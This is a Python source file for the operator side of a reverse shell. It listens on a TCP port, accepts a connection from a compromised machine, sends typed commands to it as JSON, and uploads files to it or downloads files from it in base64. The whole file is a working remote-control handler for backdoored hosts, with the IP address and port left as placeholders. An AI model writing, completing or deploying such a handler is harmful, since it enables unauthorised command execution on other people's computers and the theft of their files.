import socket
import simplejson
import base64


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("Listening?")
        (self.connection, address) = listener.accept()
        print("Connection OK from" + str(address))

    def json_send(self, data):
        json_data = simplejson.dumps(data)
        self.connection.send(json_data.encode("utf-8"))

    def json_recv(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue

    def execcommand(self, command):
        self.json_send(command)

        if command[0] == "Quit":
            self.connection.close()
            exit()
        return self.json_recv()

    def save_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "DONE"

    def upload(self, path):
        with open(path, "rb") as my_file:
            return base64.b64encode(my_file.read())

    def start(self):
        while True:
            command = input("Enter Command: ")
            command = command.split(" ")
            try:
                if command[0] == "upload":
                    file_content = self.upload(command[1])
                    command.append(file_content.decode())


                output = self.execcommand(command)

                if command[0] == "download" and "Error!" not in output:
                    output = self.save_file(command[1], output)
            except Exception:
                output = "Error!"
            print(output)


thelistener = Listener("ipaddress", PORT)
# have to add listener's ipaddress and the port here
thelistener.start()
